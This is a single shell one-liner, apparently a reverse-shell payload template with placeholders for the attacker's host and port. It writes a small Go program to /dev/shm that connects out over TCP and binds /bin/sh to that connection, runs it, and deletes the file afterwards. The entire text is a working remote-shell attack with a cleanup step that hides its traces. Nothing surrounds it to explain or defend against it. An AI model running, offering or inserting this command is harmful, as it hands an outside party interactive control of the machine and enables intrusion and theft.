echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","§LHOST§:§LPORT§");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'>/dev/shm/t.go&&go run /dev/shm/t.go;rm -f /dev/shm/t.go
